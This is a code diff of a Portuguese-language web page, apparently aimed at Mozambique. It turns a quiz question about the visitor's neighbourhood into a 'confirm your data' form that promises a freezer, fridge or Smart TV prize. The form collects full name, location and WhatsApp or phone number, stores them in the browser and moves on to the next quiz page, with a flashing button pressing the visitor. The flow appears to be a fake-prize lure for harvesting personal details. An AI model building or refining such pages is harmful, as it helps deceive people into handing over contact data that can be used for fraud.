@@ -3,64 +3,70 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Pergunta 4</title>
+  <title>Confirma os Teus Dados</title>
   <style>
     body {
       margin: 0;
-      padding: 0 20px;
+      padding: 30px 20px;
       background: #0d0d0d;
       color: #fff;
       font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
     }
 
     .container {
       max-width: 480px;
-      width: 100%;
-      padding-top: 40px;
-      text-align: center;
+      margin: auto;
     }
 
     h1 {
-      font-size: 1.6rem;
-      color: #ff3c3c;
-      margin-bottom: 10px;
+      font-size: 1.8rem;
+      color: #ff4d4d;
+      text-align: center;
+      margin-bottom: 20px;
     }
 
     p {
       font-size: 1.1rem;
+      margin-bottom: 20px;
+      line-height: 1.6;
       color: #ddd;
+    }
+
+    .input-group {
       margin-bottom: 25px;
     }
 
-    input[type="text"] {
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+    }
+
+    input[type="text"], input[type="tel"] {
       width: 100%;
-      padding: 15px;
-      font-size: 1.1rem;
+      padding: 14px;
       border-radius: 10px;
       border: none;
-      background: #1e1e1e;
+      background: #1a1a1a;
       color: #fff;
-      margin-bottom: 30px;
+      font-size: 1rem;
       box-shadow: 0 0 10px #ff1a1a33;
     }
 
     .botao {
       background: linear-gradient(45deg, #ff1a1a, #cc0000);
       color: white;
-      padding: 16px;
-      border: none;
-      border-radius: 12px;
-      font-size: 1.2rem;
+      font-size: 1.3rem;
       font-weight: bold;
+      padding: 16px;
+      border-radius: 12px;
+      text-align: center;
+      text-decoration: none;
+      display: block;
+      width: 100%;
       cursor: pointer;
       animation: piscar 1.5s infinite;
       box-shadow: 0 0 15px #ff1a1a88;
-      width: 100%;
-      max-width: 460px;
     }
 
     @keyframes piscar {
@@ -72,27 +78,49 @@
 </head>
 <body>
   <div class="container" id="conteudo">
-    <h1>📍 Pergunta 4</h1>
-    <p>Em que bairro ou zona está a viver actualmente?</p>
+    <h1>📍 Confirma os Teus Dados</h1>
 
-    <input type="text" id="localizacao" placeholder="Ex: Matola, Mafalala, Polana, etc." />
+    <p>📝 Este será o contacto que vamos usar quando o prémio estiver a caminho. Assim que o agente da entrega chegar na tua zona, <strong>irá ligar para ti</strong> para <strong>acompanhar o produto até à tua casa</strong>.</p>
 
-    <button class="botao" onclick="irProxima()">✅ Continuar</button>
+    <p>⚠️ Garante que os dados estão correctos. Caso contrário, não poderás receber o teu congelador, geleira ou TV Smart.</p>
+
+    <div class="input-group">
+      <label for="nome">Nome Completo:</label>
+      <input type="text" id="nome" placeholder="Ex: João Cardoso" required>
+    </div>
+
+    <div class="input-group">
+      <label for="zona">Localização / Bairro:</label>
+      <input type="text" id="zona" placeholder="Ex: Matola, Polana, Mafalala..." required>
+    </div>
+
+    <div class="input-group">
+      <label for="contacto">Contacto (WhatsApp ou Telemóvel):</label>
+      <input type="tel" id="contacto" placeholder="Ex: 84xxxxxxx ou 85xxxxxxx" required>
+    </div>
+
+    <button class="botao" onclick="guardarDados()">✅ Continuar</button>
   </div>
 
   <script>
-    function irProxima() {
-      const local = document.getElementById('localizacao').value.trim();
-      if (local.length < 3) {
-        alert("Por favor, indique a sua localização correctamente.");
+    function guardarDados() {
+      const nome = document.getElementById('nome').value.trim();
+      const zona = document.getElementById('zona').value.trim();
+      const contacto = document.getElementById('contacto').value.trim();
+
+      if (nome.length < 3 || zona.length < 3 || contacto.length < 7) {
+        alert("Por favor, preenche todos os campos correctamente.");
         return;
       }
 
-      localStorage.setItem("localizacao", local);
+      localStorage.setItem("nomeCliente", nome);
+      localStorage.setItem("zonaCliente", zona);
+      localStorage.setItem("contactoCliente", contacto);
+
       window.location.href = "quiz6.html";
     }
 
-    // Scroll automático
+    // Scroll automático após 3 segundos
     window.addEventListener('load', () => {
       setTimeout(() => {
         document.getElementById('conteudo').scrollIntoView({ behavior: 'smooth' });
